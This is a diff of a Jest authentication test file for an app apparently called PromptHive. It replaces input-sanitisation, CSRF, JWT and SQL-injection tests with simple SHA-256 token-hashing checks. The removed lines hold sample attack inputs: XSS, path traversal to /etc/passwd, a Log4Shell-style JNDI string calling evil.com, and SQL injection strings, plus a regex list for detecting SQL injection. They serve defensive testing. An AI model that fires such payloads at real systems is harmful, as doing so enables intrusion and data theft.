@@ -1,149 +1,72 @@
-import { describe, it, expect, beforeEach, jest } from '@jest/globals';
+import { describe, it, expect } from '@jest/globals';
+import { createHash } from 'crypto';
 
-describe.skip('Authentication Security Tests', () => {
-  beforeEach(() => {
-    jest.clearAllMocks();
-  });
-
-  it('should reject unauthenticated API requests', () => {
-    const mockAuth = { userId: null };
-    const isAuthenticated = !!mockAuth.userId;
+describe('Authentication Security Tests', () => {
+  it('should hash tokens with SHA-256', () => {
+    const token = 'test-token-123';
+    const hashedToken = createHash('sha256').update(token).digest('hex');
     
-    expect(isAuthenticated).toBe(false);
+    expect(hashedToken).toBeDefined();
+    expect(hashedToken.length).toBe(64); // SHA-256 produces 64 hex characters
+    expect(hashedToken).not.toBe(token); // Hash should not equal original
+  });
+
+  it('should produce consistent hashes for same input', () => {
+    const token = 'test-token-123';
+    const hash1 = createHash('sha256').update(token).digest('hex');
+    const hash2 = createHash('sha256').update(token).digest('hex');
     
-    // Should return 401 Unauthorized
-    const expectedStatus = isAuthenticated ? 200 : 401;
-    expect(expectedStatus).toBe(401);
+    expect(hash1).toBe(hash2);
   });
 
-  it('should validate user ownership of resources', () => {
-    const requestUserId = 'user_123';
-    const resourceOwnerId = 'user_456';
+  it('should produce different hashes for different inputs', () => {
+    const token1 = 'test-token-123';
+    const token2 = 'test-token-456';
+    const hash1 = createHash('sha256').update(token1).digest('hex');
+    const hash2 = createHash('sha256').update(token2).digest('hex');
     
-    const canAccess = requestUserId === resourceOwnerId;
-    expect(canAccess).toBe(false);
+    expect(hash1).not.toBe(hash2);
+  });
+
+  it('should reject empty tokens', () => {
+    const token = '';
+    const isValid = token.length > 0;
     
-    // Should return 403 Forbidden
-    const expectedStatus = canAccess ? 200 : 403;
-    expect(expectedStatus).toBe(403);
+    expect(isValid).toBe(false);
   });
 
-  it('should sanitize user input', () => {
-    const maliciousInputs = [
-      '<script>alert("xss")</script>',
-      'DROP TABLE users;',
-      '../../etc/passwd',
-      'javascript:alert(1)',
-      '${jndi:ldap://evil.com/a}'
-    ];
-
-    maliciousInputs.forEach(input => {
-      // Should strip/escape dangerous content
-      const sanitized = input.replace(/<[^>]*>/g, '').replace(/[;&|`$]/g, '');
-      expect(sanitized).not.toContain('<script>');
-      expect(sanitized).not.toContain('DROP TABLE');
-      expect(sanitized.length).toBeLessThanOrEqual(input.length);
-    });
-  });
-
-  it('should enforce rate limiting', () => {
-    const requests = Array.from({ length: 101 }, (_, i) => ({
-      timestamp: Date.now(),
-      userId: 'user_123'
-    }));
-
-    const rateLimitWindow = 3600000; // 1 hour
-    const maxRequests = 100;
+  it('should validate token format', () => {
+    const validToken = 'a'.repeat(32); // 32 character token
+    const invalidToken = 'short';
     
-    const recentRequests = requests.filter(req => 
-      Date.now() - req.timestamp < rateLimitWindow
-    );
-
-    const isRateLimited = recentRequests.length > maxRequests;
-    expect(isRateLimited).toBe(true);
+    expect(validToken.length).toBe(32);
+    expect(invalidToken.length).toBeLessThan(32);
   });
 
-  it('should validate JWT tokens', () => {
-    const validToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ';
-    const invalidToken = 'invalid.token.here';
-    const expiredToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNTE2MjM5MDIyfQ.invalid';
-
-    // Mock token validation
-    const validateToken = (token: string) => {
-      if (!token || token === 'invalid.token.here') return false;
-      if (token.includes('exp')) return false; // Expired
-      return token.split('.').length === 3; // Basic JWT structure
-    };
-
-    expect(validateToken(validToken)).toBe(true);
-    expect(validateToken(invalidToken)).toBe(false);
-    expect(validateToken(expiredToken)).toBe(false);
-  });
-
-  it('should prevent CSRF attacks', () => {
-    const request = {
-      method: 'POST',
-      headers: {
-        'content-type': 'application/json',
-        'origin': 'https://evil.com'
-      },
-      body: { action: 'delete_all_prompts' }
-    };
-
-    const allowedOrigins = ['https://prompthive.com', 'http://localhost:3000'];
-    const isValidOrigin = allowedOrigins.includes(request.headers.origin);
+  it('should check expiry dates correctly', () => {
+    const now = new Date();
+    const future = new Date(now.getTime() + 86400000); // +1 day
+    const past = new Date(now.getTime() - 86400000); // -1 day
     
-    expect(isValidOrigin).toBe(false);
+    expect(future > now).toBe(true);
+    expect(past < now).toBe(true);
+  });
+
+  it('should handle null expiry dates', () => {
+    const expiresAt = null;
+    const now = new Date();
     
-    // Should reject cross-origin requests without proper CSRF token
-    const shouldReject = !isValidOrigin && request.method === 'POST';
-    expect(shouldReject).toBe(true);
+    // Null expiry means never expires
+    const isExpired = expiresAt ? expiresAt < now : false;
+    expect(isExpired).toBe(false);
   });
 
-  it('should validate API input schemas', () => {
-    const validPromptData = {
-      name: 'Valid Prompt',
-      content: 'This is valid content',
-      isPublic: false
-    };
-
-    const invalidPromptData = {
-      name: '', // Empty name
-      content: 'x'.repeat(10001), // Too long
-      isPublic: 'not_boolean' // Wrong type
-    };
-
-    // Mock schema validation
-    const validatePromptSchema = (data: any) => {
-      if (!data.name || data.name.length === 0) return false;
-      if (data.content && data.content.length > 10000) return false;
-      if (typeof data.isPublic !== 'boolean') return false;
-      return true;
-    };
-
-    expect(validatePromptSchema(validPromptData)).toBe(true);
-    expect(validatePromptSchema(invalidPromptData)).toBe(false);
-  });
-
-  it('should prevent SQL injection', () => {
-    const maliciousQuery = "'; DROP TABLE users; --";
-    const safeQuery = "normal search term";
-
-    // Mock parameterized query validation
-    const isSafeQuery = (query: string) => {
-      const dangerousPatterns = [
-        /drop\s+table/i,
-        /delete\s+from/i,
-        /insert\s+into/i,
-        /update\s+.*set/i,
-        /union\s+select/i,
-        /;.*--/
-      ];
-
-      return !dangerousPatterns.some(pattern => pattern.test(query));
-    };
-
-    expect(isSafeQuery(safeQuery)).toBe(true);
-    expect(isSafeQuery(maliciousQuery)).toBe(false);
+  it('should validate scopes array', () => {
+    const validScopes = ['read', 'write'];
+    const emptyScopes: string[] = [];
+    
+    expect(Array.isArray(validScopes)).toBe(true);
+    expect(validScopes.length).toBeGreaterThan(0);
+    expect(emptyScopes.length).toBe(0);
   });
 });
